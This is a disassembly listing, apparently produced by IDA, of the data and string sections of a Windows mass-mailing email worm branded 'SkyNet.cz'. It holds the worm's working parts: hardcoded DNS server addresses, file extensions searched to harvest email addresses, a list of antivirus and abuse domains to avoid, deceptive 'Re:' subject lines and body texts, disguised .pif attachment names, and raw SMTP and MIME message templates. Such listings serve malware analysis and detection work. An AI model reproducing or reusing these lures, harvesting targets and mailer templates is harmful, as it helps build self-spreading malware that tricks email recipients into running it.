SrcStr		dw 0			; DATA XREF: ___crtGetStringTypeA+39o
					; ___crtLCMapStringA+36o
		align 8
dword_4064B8	dd 0FFFFFFFFh, 404C21h,	404C25h	; DATA XREF: ___crtGetStringTypeA+5o
; char aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+3Do
		align 4
; char aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+35o
; char ProcName[]
ProcName	db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+24o
; char LibFileName[]
LibFileName	db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+Do
		align 10h
dword_406500	dd 0FFFFFFFFh, 405565h,	405569h, 0FFFFFFFFh, 405619h, 40561Dh
					; DATA XREF: ___crtLCMapStringA+5o
		dd 3 dup(0), 65ACh, 610Ch, 3 dup(0), 65B7h, 6018h, 3 dup(0)
		dd 65C4h, 6118h, 3 dup(0), 65D0h, 6120h, 3 dup(0), 65DBh
		dd 6168h, 3 dup(0), 65E8h, 6000h, 7 dup(0), 52455355h
		dd 642E3233h, 4B006C6Ch, 454E5245h, 2E32334Ch, 6C6C64h
		dd 494E4957h, 2E54454Eh, 6C6C64h, 5F325357h, 642E3233h
		dd 69006C6Ch, 706C6870h, 2E697061h, 6C6C64h, 41564441h
		dd 32334950h, 6C6C642Eh, 48h dup(0), 73770000h,	6E697270h
		dd 416674h, 68430000h, 6F4C7261h, 42726577h, 41666675h
		dd 4 dup(0), 626F6C47h,	72466C61h, 6565h, 6C470000h, 6C61626Fh
		dd 6F6C6C41h, 63h, 54746547h, 5A656D69h, 49656E6Fh, 726F666Eh
		dd 6974616Dh, 6E6Fh, 65470000h,	636F4C74h, 69546C61h, 656Dh
		dd 6C5F0000h, 64616572h, 0, 6C636C5Fh, 65736Fh,	6C5F0000h
		dd 6E65706Fh, 0, 4D746547h, 6C75646Fh, 6C694665h, 6D614E65h
		dd 4165h, 736C0000h, 70637274h,	4179h, 736C0000h, 656C7274h
		dd 416Eh, 6C5F0000h, 6565736Ch,	6Bh, 646E6946h,	736F6C43h
		dd 65h,	646E6946h, 7478654Eh, 656C6946h, 41h, 646E6946h
		dd 73726946h, 6C694674h, 4165h,	65470000h, 69724474h, 79546576h
		dd 416570h, 65530000h, 72685474h, 50646165h, 726F6972h
		dd 797469h, 65470000h, 72754374h, 746E6572h, 65726854h
		dd 6461h, 6F430000h, 69467970h,	41656Ch, 65470000h, 6E695774h
		dd 73776F64h, 65726944h, 726F7463h, 4179h, 6C530000h, 706565h
		dd 65420000h, 7065h, 72430000h,	65746165h, 65726854h, 6461h
		dd 65470000h, 73614C74h, 72724574h, 726Fh, 72430000h, 65746165h
		dd 6574754Dh, 4178h, 65470000h,	63695474h, 756F436Bh, 746Eh
		dd 4 dup(0), 65746E49h,	74656E72h, 43746547h, 656E6E6Fh
		dd 64657463h, 74617453h, 65h, 6	dup(0),	4E746547h, 6F777465h
		dd 61506B72h, 736D6172h, 4 dup(0), 65520000h, 6F6C4367h
		dd 654B6573h, 79h, 44676552h, 74656C65h, 6C615665h, 416575h
		dd 65520000h, 65704F67h, 79654B6Eh, 41h, 44676552h, 74656C65h
		dd 79654B65h, 41h, 53676552h, 61567465h, 4565756Ch, 4178h
		dd 4 dup(0), 4D746547h,	6C75646Fh, 6E614865h, 41656C64h
		dd 0, 53746547h, 74726174h, 6E497075h, 416F66h,	65470000h
		dd 6D6F4374h, 646E616Dh, 656E694Ch, 41h, 56746547h, 69737265h
		dd 6E6Fh, 78450000h, 72507469h,	7365636Fh, 73h,	70616548h
		dd 6F6C6C41h, 63h, 70616548h, 65657246h, 0, 6D726554h
		dd 74616E69h, 6F725065h, 73736563h, 0, 43746547h, 65727275h
		dd 7250746Eh, 7365636Fh, 73h, 61686E55h, 656C646Eh, 63784564h
		dd 69747065h, 69466E6Fh, 7265746Ch, 0, 65657246h, 69766E45h
		dd 6D6E6F72h, 53746E65h, 6E697274h, 417367h, 72460000h
		dd 6E456565h, 6F726976h, 6E656D6Eh, 72745374h, 73676E69h
		dd 57h,	65646957h, 72616843h, 754D6F54h, 4269746Ch, 657479h
		dd 65470000h, 766E4574h, 6E6F7269h, 746E656Dh, 69727453h
		dd 73676Eh, 65470000h, 766E4574h, 6E6F7269h, 746E656Dh
		dd 69727453h, 5773676Eh, 0, 48746553h, 6C646E61h, 756F4365h
		dd 746Eh, 65470000h, 64745374h,	646E6148h, 656Ch, 65470000h
		dd 6C694674h, 70795465h, 65h, 70616548h, 74736544h, 796F72h
		dd 65480000h, 72437061h, 65746165h, 0, 74726956h, 466C6175h
		dd 656572h, 74520000h, 776E556Ch, 646E69h, 72570000h, 46657469h
		dd 656C69h, 69560000h, 61757472h, 6C6C416Ch, 636Fh, 65480000h
		dd 65527061h, 6F6C6C41h, 63h, 746C754Dh, 74794269h, 576F5465h
		dd 43656469h, 726168h, 65470000h, 72745374h, 54676E69h
		dd 41657079h, 0, 53746547h, 6E697274h, 70795467h, 5765h
		dd 65470000h, 49504374h, 6F666Eh, 65470000h, 50434174h
		dd 0, 4F746547h, 50434D45h, 0, 50746547h, 41636F72h, 65726464h
		dd 7373h, 6F4C0000h, 694C6461h,	72617262h, 4179h, 434C0000h
		dd 5370614Dh, 6E697274h, 4167h,	434C0000h, 5370614Dh, 6E697274h
		dd 5767h, 0Ch dup(0)
		dd 100h	dup(?)
B		ends

; Section 3. (virtual address 00007000)
; Virtual size			: 0000F000 (  61440.)
; Section size in file		: 00001400 (   5120.)
; Offset to raw	data for section: 00005800
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
C		segment	para public 'CODE' use32
		assume cs:C
		;org 407000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
dword_407000	dd 0			; DATA XREF: __cinit+1Fo
dword_407004	dd 0			; DATA XREF: __cinit+1Ao
dword_407008	dd 0, 405077h		; DATA XREF: __cinit+10o
dword_407010	dd 0			; DATA XREF: __cinit:loc_403676o
dword_407014	dd 0			; DATA XREF: _doexit+65o
dword_407018	dd 0			; DATA XREF: _doexit:loc_40371Ao
dword_40701C	dd 0			; DATA XREF: _doexit+76o
dword_407020	dd 4 dup(0)		; DATA XREF: _doexit:loc_40372Bo
off_407030	dd offset a62_155_255_16 ; DATA	XREF: sub_40156C:loc_401627o
					; "62.155.255.16"
		dd offset a212_185_252_73 ; "212.185.252.73"
		dd offset a212_185_253_70 ; "212.185.253.70"
		dd offset a212_185_252_13 ; "212.185.252.136"
		dd offset a194_25_2_129	; "194.25.2.129"
		dd offset a194_25_2_130	; "194.25.2.130"
		dd offset a195_20_224_234 ; "195.20.224.234"
		dd offset a217_5_97_137	; "217.5.97.137"
		dd offset a194_25_2_129	; "194.25.2.129"
		dd offset a193_193_144_12 ; "193.193.144.12"
		dd offset a212_7_128_162 ; "212.7.128.162"
		dd offset a212_7_128_165 ; "212.7.128.165"
		dd offset a193_193_158_10 ; "193.193.158.10"
		dd offset a194_25_2_131	; "194.25.2.131"
		dd offset a194_25_2_132	; "194.25.2.132"
		dd offset a194_25_2_133	; "194.25.2.133"
		dd offset a194_25_2_134	; "194.25.2.134"
		dd offset a193_141_40_42 ; "193.141.40.42"
		dd offset a145_253_2_171 ; "145.253.2.171"
		dd offset a193_189_244_20 ; "193.189.244.205"
		dd offset a213_191_74_19 ; "213.191.74.19"
		dd offset a151_189_13_35 ; "151.189.13.35"
		dd offset a195_185_185_19 ; "195.185.185.195"
		dd offset a195_185_185_19 ; "195.185.185.195"
		dd offset a212_44_160_8	; "212.44.160.8"
aSkynet_czSyste	db '[SkyNet.cz]SystemsMutex',0 ; DATA XREF: sub_40156C+E7o
					; WinMain(x,x,x,x)+16o
; char *off_4070AC
off_4070AC	dd offset a__		; DATA XREF: sub_402235+3Er
					; sub_402235+5Fr
					; "._-\\/"
		dd offset a@		; "@"
		dd offset a__1		; ".[]-"
; char *off_4070B8
off_4070B8	dd offset a_eml		; DATA XREF: sub_402235+10Er
					; sub_4023E2+40r
					; ".eml"
		dd offset a_txt		; ".txt"
		dd offset a_php		; ".php"
		dd offset a_pl		; ".pl"
		dd offset a_htm		; ".htm"
		dd offset a_html	; ".html"
		dd offset a_vbs		; ".vbs"
		dd offset a_rtf		; ".rtf"
		dd offset a_uin		; ".uin"
		dd offset a_asp		; ".asp"
		dd offset a_wab		; ".wab"
		dd offset a_doc		; ".doc"
		dd offset a_adb		; ".adb"
		dd offset a_tbb		; ".tbb"
		dd offset a_dbx		; ".dbx"
		dd offset a_sht		; ".sht"
		dd offset a_oft		; ".oft"
		dd offset a_msg		; ".msg"
		dd offset a_shtm	; ".shtm"
		dd offset a_cgi		; ".cgi"
		dd offset a_dhtm	; ".dhtm"
		dd offset a0123456789	; "0123456789"
		dd offset aBeAwareSkynet_ ; "be	aware! Skynet.cz - -->AntiHacker Cre"...
off_407114	dd offset aIcrosoft	; DATA XREF: sub_4021B2+7o
					; "icrosoft"
		dd offset aAntivi	; "antivi"
		dd offset aYmantec	; "ymantec"
		dd offset aSpam		; "spam"
		dd offset aAvp		; "avp"
		dd offset aFSecur	; "f-secur"
		dd offset aItdefender	; "itdefender"
		dd offset aOrman	; "orman"
		dd offset aCafee	; "cafee"
		dd offset aAspersky	; "aspersky"
		dd offset aFPro		; "f-pro"
		dd offset aOrton	; "orton"
		dd offset aFbi		; "fbi"
		dd offset aAbuse	; "abuse"
		dd offset aMessagelabs	; "messagelabs"
		dd offset aSkynet	; "skynet"
dword_407154	dd 4076F4h		; DATA XREF: sub_4019FF+138r
					; sub_4021B2+1Do
		dd offset aReReDocument	; "Re: Re: Document"
		dd offset aReReThanks	; "Re: Re: Thanks!"
		dd offset aReThanks	; "Re: Thanks!"
		dd offset aReYourDocument ; "Re: Your document"
		dd offset aReHereIsTheDoc ; "Re: Here is the document"
		dd offset aReYourPicture ; "Re:	Your picture"
		dd offset aReReMessage	; "Re: Re: Message"
		dd offset aReHi		; "Re: Hi"
		dd offset aReHello	; "Re: Hello"
		dd offset aReReReYourDocu ; "Re: Re: Re: Your document"
		dd offset aReHere	; "Re: Here"
		dd offset aReYourMusic	; "Re: Your music"
		dd offset aReYourSoftware ; "Re: Your software"
		dd offset aReApproved	; "Re: Approved"
		dd offset aReDetails	; "Re: Details"
		dd offset aReExcelFile	; "Re: Excel file"
		dd offset aReWordFile	; "Re: Word file"
		dd offset aReMyDetails	; "Re: My details"
		dd offset aReYourDetails ; "Re:	Your details"
		dd offset aReYourBill	; "Re: Your bill"
		dd offset aReYourText	; "Re: Your text"
		dd offset aReYourArchive ; "Re:	Your archive"
		dd offset aReYourLetter	; "Re: Your letter"
		dd offset aReYourProduct ; "Re:	Your product"
		dd offset aReYourWebsite ; "Re:	Your website"
dword_4071BC	dd 407530h		; DATA XREF: sub_4019FF+30Cr
		dd offset aYour_document_ ; "your_document.pif"
		dd offset aDocument_pif	; "document.pif"
		dd offset aMessage_part2_ ; "message_part2.pif"
		dd offset aYour_document_ ; "your_document.pif"
		dd offset aDocument_full_ ; "document_full.pif"
		dd offset aYour_picture_p ; "your_picture.pif"
		dd offset aMessage_detail ; "message_details.pif"
		dd offset aYour_file_pif ; "your_file.pif"
		dd offset aYour_picture_p ; "your_picture.pif"
		dd offset aDocument_4351_ ; "document_4351.pif"
		dd offset aYours_pif	; "yours.pif"
		dd offset aMp3music_pif	; "mp3music.pif"
		dd offset aApplication_pi ; "application.pif"
		dd offset aAll_document_p ; "all_document.pif"
		dd offset aMy_details_pif ; "my_details.pif"
		dd offset aDocument_excel ; "document_excel.pif"
		dd offset aDocument_word_ ; "document_word.pif"
		dd offset aMy_details_pif ; "my_details.pif"
		dd offset aYour_details_p ; "your_details.pif"
		dd offset aYour_bill_pif ; "your_bill.pif"
		dd offset aYour_text_pif ; "your_text.pif"
		dd offset aYour_archive_p ; "your_archive.pif"
		dd offset aYour_letter_pi ; "your_letter.pif"
		dd offset aYour_product_p ; "your_product.pif"
		dd offset aYour_website_p ; "your_website.pif"
; char *off_407224
off_407224	dd offset aYourDocumentIs ; DATA XREF: sub_4019FF+56Br
					; "Your	document is attached."
		dd offset aHereIsTheFile_ ; "Here is the file."
		dd offset aSeeTheAttached ; "See the attached file for details."
		dd offset aPleaseHaveALoo ; "Please have a look	at the attached	file"...
		dd offset aPleaseReadTheA ; "Please read the attached file."
		dd offset aYourFileIsAtta ; "Your file is attached."
off_40723C	dd offset dword_4072F8	; DATA XREF: StartAddress+10o
		dd offset dword_4072F4
		dd offset dword_4072F0
		dd offset dword_4072EC
		dd offset dword_4072E8
		dd offset dword_4072E4
		dd offset dword_4072E0
		dd offset dword_4072DC
		dd offset dword_4072D8
		dd offset dword_4072D4
		dd offset dword_4072D0
		dd offset dword_4072CC
		dd offset dword_4072C8
		dd offset dword_4072C4
		dd offset dword_4072C0
		dd offset dword_4072BC
		dd offset dword_4072B8
		dd offset dword_4072B4
		dd offset dword_4072B0
		dd offset dword_4072AC
		dd offset dword_4072A8
		dd offset dword_4072A4
		dd offset dword_4072A0
		dd offset dword_40729C
dword_40729C	dd 3A7Ah		; DATA XREF: StartAddress+2Do
					; C:00407298o
dword_4072A0	dd 3A79h		; DATA XREF: C:00407294o
dword_4072A4	dd 3A78h		; DATA XREF: C:00407290o
dword_4072A8	dd 3A77h		; DATA XREF: C:0040728Co
dword_4072AC	dd 3A76h		; DATA XREF: C:00407288o
dword_4072B0	dd 3A75h		; DATA XREF: C:00407284o
dword_4072B4	dd 3A74h		; DATA XREF: C:00407280o
dword_4072B8	dd 3A73h		; DATA XREF: C:0040727Co
dword_4072BC	dd 3A72h		; DATA XREF: C:00407278o
dword_4072C0	dd 3A71h		; DATA XREF: C:00407274o
dword_4072C4	dd 3A70h		; DATA XREF: C:00407270o
dword_4072C8	dd 3A6Fh		; DATA XREF: C:0040726Co
dword_4072CC	dd 3A6Eh		; DATA XREF: C:00407268o
dword_4072D0	dd 3A6Dh		; DATA XREF: C:00407264o
dword_4072D4	dd 3A6Ch		; DATA XREF: C:00407260o
dword_4072D8	dd 3A6Bh		; DATA XREF: C:0040725Co
dword_4072DC	dd 3A6Ah		; DATA XREF: C:00407258o
dword_4072E0	dd 3A69h		; DATA XREF: C:00407254o
dword_4072E4	dd 3A68h		; DATA XREF: C:00407250o
dword_4072E8	dd 3A67h		; DATA XREF: C:0040724Co
dword_4072EC	dd 3A66h		; DATA XREF: C:00407248o
dword_4072F0	dd 3A65h		; DATA XREF: C:00407244o
dword_4072F4	dd 3A64h		; DATA XREF: C:00407240o
dword_4072F8	dd 3A63h		; DATA XREF: C:off_40723Co
aYourFileIsAtta	db 'Your file is attached.',0 ; DATA XREF: C:00407238o
		align 4
aPleaseReadTheA	db 'Please read the attached file.',0 ; DATA XREF: C:00407234o
		align 4
aPleaseHaveALoo	db 'Please have a look at the attached file.',0 ; DATA XREF: C:00407230o
		align 10h
aSeeTheAttached	db 'See the attached file for details.',0 ; DATA XREF: C:0040722Co
		align 4
aHereIsTheFile_	db 'Here is the file.',0 ; DATA XREF: C:00407228o
		align 4
aYourDocumentIs	db 'Your document is attached.',0 ; DATA XREF: C:off_407224o
		align 4
aYour_website_p	db 'your_website.pif',0 ; DATA XREF: C:00407220o
		align 4
aYour_product_p	db 'your_product.pif',0 ; DATA XREF: C:0040721Co
		align 4
aYour_letter_pi	db 'your_letter.pif',0  ; DATA XREF: C:00407218o
aYour_archive_p	db 'your_archive.pif',0 ; DATA XREF: C:00407214o
		align 10h
aYour_text_pif	db 'your_text.pif',0    ; DATA XREF: C:00407210o
		align 10h
aYour_bill_pif	db 'your_bill.pif',0    ; DATA XREF: C:0040720Co
		align 10h
aYour_details_p	db 'your_details.pif',0 ; DATA XREF: C:00407208o
		align 4
aDocument_word_	db 'document_word.pif',0 ; DATA XREF: C:00407200o
		align 4
aDocument_excel	db 'document_excel.pif',0 ; DATA XREF: C:004071FCo
		align 4
aMy_details_pif	db 'my_details.pif',0   ; DATA XREF: C:004071F8o C:00407204o
		align 4
aAll_document_p	db 'all_document.pif',0 ; DATA XREF: C:004071F4o
		align 10h
aApplication_pi	db 'application.pif',0  ; DATA XREF: C:004071F0o
aMp3music_pif	db 'mp3music.pif',0     ; DATA XREF: C:004071ECo
		align 10h
aYours_pif	db 'yours.pif',0        ; DATA XREF: C:004071E8o
		align 4
aDocument_4351_	db 'document_4351.pif',0 ; DATA XREF: C:004071E4o
		align 10h
aYour_file_pif	db 'your_file.pif',0    ; DATA XREF: C:004071DCo
		align 10h
aMessage_detail	db 'message_details.pif',0 ; DATA XREF: C:004071D8o
aYour_picture_p	db 'your_picture.pif',0 ; DATA XREF: C:004071D4o C:004071E0o
		align 4
aDocument_full_	db 'document_full.pif',0 ; DATA XREF: C:004071D0o
		align 4
aMessage_part2_	db 'message_part2.pif',0 ; DATA XREF: C:004071C8o
		align 10h
aDocument_pif	db 'document.pif',0     ; DATA XREF: C:004071C4o
		align 10h
aYour_document_	db 'your_document.pif',0 ; DATA XREF: C:004071C0o C:004071CCo
		align 4
aReYourWebsite	db 'Re: Your website',0 ; DATA XREF: C:004071B8o
		align 4
aReYourProduct	db 'Re: Your product',0 ; DATA XREF: C:004071B4o
		align 4
aReYourLetter	db 'Re: Your letter',0  ; DATA XREF: C:004071B0o
aReYourArchive	db 'Re: Your archive',0 ; DATA XREF: C:004071ACo
		align 10h
aReYourText	db 'Re: Your text',0    ; DATA XREF: C:004071A8o
		align 10h
aReYourBill	db 'Re: Your bill',0    ; DATA XREF: C:004071A4o
		align 10h
aReYourDetails	db 'Re: Your details',0 ; DATA XREF: C:004071A0o
		align 4
aReMyDetails	db 'Re: My details',0   ; DATA XREF: C:0040719Co
		align 4
aReWordFile	db 'Re: Word file',0    ; DATA XREF: C:00407198o
		align 4
aReExcelFile	db 'Re: Excel file',0   ; DATA XREF: C:00407194o
		align 4
aReDetails	db 'Re: Details',0      ; DATA XREF: C:00407190o
aReApproved	db 'Re: Approved',0     ; DATA XREF: C:0040718Co
		align 10h
aReYourSoftware	db 'Re: Your software',0 ; DATA XREF: C:00407188o
		align 4
aReYourMusic	db 'Re: Your music',0   ; DATA XREF: C:00407184o
		align 4
aReHere		db 'Re: Here',0         ; DATA XREF: C:00407180o
		align 10h
aReReReYourDocu	db 'Re: Re: Re: Your document',0 ; DATA XREF: C:0040717Co
		align 4
aReHello	db 'Re: Hello',0        ; DATA XREF: C:00407178o
		align 4
aReHi		db 'Re: Hi',0           ; DATA XREF: C:00407174o
		align 10h
aReReMessage	db 'Re: Re: Message',0  ; DATA XREF: C:00407170o
aReYourPicture	db 'Re: Your picture',0 ; DATA XREF: C:0040716Co
		align 4
aReHereIsTheDoc	db 'Re: Here is the document',0 ; DATA XREF: C:00407168o
		align 10h
aReYourDocument	db 'Re: Your document',0 ; DATA XREF: C:00407164o
		align 4
aReThanks	db 'Re: Thanks!',0      ; DATA XREF: C:00407160o
aReReThanks	db 'Re: Re: Thanks!',0  ; DATA XREF: C:0040715Co
aReReDocument	db 'Re: Re: Document',0 ; DATA XREF: C:00407158o
		align 4
aReDocument	db 'Re: Document',0
		align 4
aSkynet		db 'skynet',0           ; DATA XREF: C:00407150o
		align 4
aMessagelabs	db 'messagelabs',0      ; DATA XREF: C:0040714Co
aAbuse		db 'abuse',0            ; DATA XREF: C:00407148o
		align 10h
aFbi		db 'fbi',0              ; DATA XREF: C:00407144o
aOrton		db 'orton',0            ; DATA XREF: C:00407140o
		align 4
aFPro		db 'f-pro',0            ; DATA XREF: C:0040713Co
		align 4
aAspersky	db 'aspersky',0         ; DATA XREF: C:00407138o
		align 10h
aCafee		db 'cafee',0            ; DATA XREF: C:00407134o
		align 4
aOrman		db 'orman',0            ; DATA XREF: C:00407130o
		align 10h
aItdefender	db 'itdefender',0       ; DATA XREF: C:0040712Co
		align 4
aFSecur		db 'f-secur',0          ; DATA XREF: C:00407128o
aAvp		db 'avp',0              ; DATA XREF: C:00407124o
aSpam		db 'spam',0             ; DATA XREF: C:00407120o
		align 10h
aYmantec	db 'ymantec',0          ; DATA XREF: C:0040711Co
aAntivi		db 'antivi',0           ; DATA XREF: C:00407118o
		align 10h
aIcrosoft	db 'icrosoft',0         ; DATA XREF: C:off_407114o
		align 4
aBeAwareSkynet_	db 'be aware! Skynet.cz - -->AntiHacker Crew<--',0 ; DATA XREF: C:00407110o
a0123456789	db '0123456789',0       ; DATA XREF: C:0040710Co
		align 4
a_dhtm		db '.dhtm',0            ; DATA XREF: C:00407108o
		align 4
a_cgi		db '.cgi',0             ; DATA XREF: C:00407104o
		align 4
a_shtm		db '.shtm',0            ; DATA XREF: C:00407100o
		align 4
; char a_msg[]
a_msg		db '.msg',0             ; DATA XREF: sub_4023E2+128o
					; C:004070FCo
		align 4
; char a_oft[]
a_oft		db '.oft',0             ; DATA XREF: sub_4023E2+13Bo
					; C:004070F8o
		align 4
; char a_sht[]
a_sht		db '.sht',0             ; DATA XREF: sub_4023E2+D0o
					; C:004070F4o
		align 4
; char a_dbx[]
a_dbx		db '.dbx',0             ; DATA XREF: sub_4023E2+161o
					; C:004070F0o
		align 4
; char a_tbb[]
a_tbb		db '.tbb',0             ; DATA XREF: sub_4023E2+E7o
					; C:004070ECo
		align 4
; char a_adb[]
a_adb		db '.adb',0             ; DATA XREF: sub_4023E2+FEo
					; C:004070E8o
		align 4
; char a_doc[]
a_doc		db '.doc',0             ; DATA XREF: sub_4023E2+14Eo
					; C:004070E4o
		align 4
; char a_wab[]
a_wab		db '.wab',0             ; DATA XREF: sub_4023E2+115o
					; C:004070E0o
		align 4
a_asp		db '.asp',0             ; DATA XREF: C:004070DCo
		align 4
a_uin		db '.uin',0             ; DATA XREF: C:004070D8o
		align 4
a_rtf		db '.rtf',0             ; DATA XREF: C:004070D4o
		align 4
a_vbs		db '.vbs',0             ; DATA XREF: C:004070D0o
		align 4
a_html		db '.html',0            ; DATA XREF: C:004070CCo
		align 4
a_htm		db '.htm',0             ; DATA XREF: C:004070C8o
		align 4
a_pl		db '.pl',0              ; DATA XREF: C:004070C4o
a_php		db '.php',0             ; DATA XREF: C:004070C0o
		align 4
a_txt		db '.txt',0             ; DATA XREF: C:004070BCo
		align 10h
a_eml		db '.eml',0             ; DATA XREF: C:off_4070B8o
		align 4
a__1		db '.[]-',0             ; DATA XREF: C:004070B4o
		align 10h
a@:					; DATA XREF: C:004070B0o
		unicode	0, <@>,0
a__		db '._-\/',0            ; DATA XREF: C:off_4070ACo
		align 4
a212_44_160_8	db '212.44.160.8',0     ; DATA XREF: C:00407090o
		align 4
a195_185_185_19	db '195.185.185.195',0  ; DATA XREF: C:00407088o C:0040708Co
a151_189_13_35	db '151.189.13.35',0    ; DATA XREF: C:00407084o
		align 4
a213_191_74_19	db '213.191.74.19',0    ; DATA XREF: C:00407080o
		align 4
a193_189_244_20	db '193.189.244.205',0  ; DATA XREF: C:0040707Co
a145_253_2_171	db '145.253.2.171',0    ; DATA XREF: C:00407078o
		align 4
a193_141_40_42	db '193.141.40.42',0    ; DATA XREF: C:00407074o
		align 4
a194_25_2_134	db '194.25.2.134',0     ; DATA XREF: C:00407070o
		align 4
a194_25_2_133	db '194.25.2.133',0     ; DATA XREF: C:0040706Co
		align 4
a194_25_2_132	db '194.25.2.132',0     ; DATA XREF: C:00407068o
		align 4
a194_25_2_131	db '194.25.2.131',0     ; DATA XREF: C:00407064o
		align 4
a193_193_158_10	db '193.193.158.10',0   ; DATA XREF: C:00407060o
		align 4
a212_7_128_165	db '212.7.128.165',0    ; DATA XREF: C:0040705Co
		align 4
a212_7_128_162	db '212.7.128.162',0    ; DATA XREF: C:00407058o
		align 4
a193_193_144_12	db '193.193.144.12',0   ; DATA XREF: C:00407054o
		align 4
a217_5_97_137	db '217.5.97.137',0     ; DATA XREF: C:0040704Co
		align 4
a195_20_224_234	db '195.20.224.234',0   ; DATA XREF: C:00407048o
		align 4
a194_25_2_130	db '194.25.2.130',0     ; DATA XREF: C:00407044o
		align 4
a194_25_2_129	db '194.25.2.129',0     ; DATA XREF: C:00407040o C:00407050o
		align 4
a212_185_252_13	db '212.185.252.136',0  ; DATA XREF: C:0040703Co
a212_185_253_70	db '212.185.253.70',0   ; DATA XREF: C:00407038o
		align 4
a212_185_252_73	db '212.185.252.73',0   ; DATA XREF: C:00407034o
		align 4
a62_155_255_16	db '62.155.255.16',0    ; DATA XREF: C:off_407030o
		align 4
; char name[]
name		db 'nameserver',0       ; DATA XREF: sub_4010A4+56o
		align 4
; char proto[]
proto		db 'UDP',0              ; DATA XREF: sub_4010A4:loc_4010F5o
; char aSUSU_2u_2u_2uS[]
aSUSU_2u_2u_2uS	db '%s, %u %s %u %.2u:%.2u:%.2u %s%.2u%.2u',0 ; DATA XREF: sub_401704+136o
		align 4
asc_407A24:				; DATA XREF: sub_401704+F6o
		unicode	0, <->,0
asc_407A28:				; DATA XREF: sub_401704+EFo
		unicode	0, <+>,0
aDec		db 'Dec',0              ; DATA XREF: sub_401704+8Bo
aNov		db 'Nov',0              ; DATA XREF: sub_401704+84o
aOct		db 'Oct',0              ; DATA XREF: sub_401704+7Do
aSep		db 'Sep',0              ; DATA XREF: sub_401704+76o
aAug		db 'Aug',0              ; DATA XREF: sub_401704+6Fo
aJul		db 'Jul',0              ; DATA XREF: sub_401704+68o
aJun		db 'Jun',0              ; DATA XREF: sub_401704+61o
aMay		db 'May',0              ; DATA XREF: sub_401704+5Ao
aApr		db 'Apr',0              ; DATA XREF: sub_401704+53o
aMar		db 'Mar',0              ; DATA XREF: sub_401704+4Co
aFeb		db 'Feb',0              ; DATA XREF: sub_401704+45o
aJan		db 'Jan',0              ; DATA XREF: sub_401704+3Eo
aSat		db 'Sat',0              ; DATA XREF: sub_401704+37o
aFri		db 'Fri',0              ; DATA XREF: sub_401704+30o
aThu		db 'Thu',0              ; DATA XREF: sub_401704+29o
aWed		db 'Wed',0              ; DATA XREF: sub_401704+22o
aTue		db 'Tue',0              ; DATA XREF: sub_401704+1Bo
aMon		db 'Mon',0              ; DATA XREF: sub_401704+14o
aSun		db 'Sun',0              ; DATA XREF: sub_401704+Co
; char buf[]
buf		db 0Dh,0Ah,0		; DATA XREF: sub_40184F+95o
					; sub_4019FF+1A0o
		align 4
; char aQuit[]
aQuit		db 'QUIT',0Dh,0Ah,0     ; DATA XREF: sub_4019FF+6D3o
		align 4
; char a_[]
a_		db 0Dh,0Ah		; DATA XREF: sub_4019FF+6A4o
		db '.',0Dh,0Ah,0
		align 4
; char asc_407A8C[]
asc_407A8C	db '--',0Dh,0Ah         ; DATA XREF: sub_4019FF+680o
		db 0Dh,0Ah,0
		align 4
; char asc_407A94[]
asc_407A94	db 0Dh,0Ah		; DATA XREF: sub_4019FF+65Co
		db 0Dh,0Ah
		db '--',0
		align 4
; char asc_407A9C[]
asc_407A9C	db '"',0Dh,0Ah          ; DATA XREF: sub_4019FF+5F4o
		db 0Dh,0Ah,0
		align 4
; char aContentTransfe[]
aContentTransfe	db '"',0Dh,0Ah          ; DATA XREF: sub_4019FF+5D0o
		db 'Content-Transfer-Encoding: base64',0Dh,0Ah
		db 'Content-Disposition: attachment;',0Dh,0Ah
		db 9,'filename="',0
; char asc_407AF8[]
asc_407AF8	db 0Dh,0Ah		; DATA XREF: sub_4019FF+586o
		db 0Dh,0Ah,0
		align 10h
; char aContentTypeTex[]
aContentTypeTex	db 'Content-Type: text/plain;',0Dh,0Ah ; DATA XREF: sub_4019FF+534o
		db 9,'charset="Windows-1252"',0Dh,0Ah
		db 'Content-Transfer-Encoding: 7bit',0Dh,0Ah
		db 0Dh,0Ah,0
; char asc_407B58[]
asc_407B58	db '--',0               ; DATA XREF: sub_4019FF+4F0o
		align 4
; char aThisIsAMultiPa[]
aThisIsAMultiPa	db 'This is a multi-part message in MIME format.',0Dh,0Ah
					; DATA XREF: sub_4019FF+4C1o
		db 0Dh,0Ah,0
		align 10h
; char aXMsmailPriorit[]
aXMsmailPriorit	db 'X-MSMail-Priority: Normal',0Dh,0Ah ; DATA XREF: sub_4019FF+4ADo
		db 0Dh,0Ah,0
		align 10h
; char aXPriority3[]
aXPriority3	db 'X-Priority: 3',0Dh,0Ah,0 ; DATA XREF: sub_4019FF+49Co
; char asc_407BC0[]
asc_407BC0	db '"',0Dh,0Ah,0        ; DATA XREF: sub_4019FF+48Bo
; char aContentTypeMul[]
aContentTypeMul	db 'Content-Type: multipart/mixed;',0Dh,0Ah ; DATA XREF: sub_4019FF+467o
		db 9,'boundary="',0
; char a_nextpart__3u_[]
a_nextpart__3u_	db '----=_NextPart_%.3u_%.4u_%.8X.%.8X',0 ; DATA XREF: sub_4019FF+455o
		align 4
; char aMimeVersion1_0[]
aMimeVersion1_0	db 0Dh,0Ah		; DATA XREF: sub_4019FF+405o
		db 'MIME-Version: 1.0',0Dh,0Ah,0
		align 4
; char aDate[]
aDate		db 'Date: ',0           ; DATA XREF: sub_4019FF+3D5o
		align 4
; char aSubject[]
aSubject	db 'Subject: ',0        ; DATA XREF: sub_4019FF+3A5o
		align 10h
; char aTo[]
aTo		db 'To: ',0             ; DATA XREF: sub_4019FF+378o
		align 4
; char aFrom[]
aFrom		db 'From: ',0           ; DATA XREF: sub_4019FF+34Bo
		align 10h
; char aContentTypeApp[]
aContentTypeApp	db 'Content-Type: application/octet-stream;',0Dh,0Ah
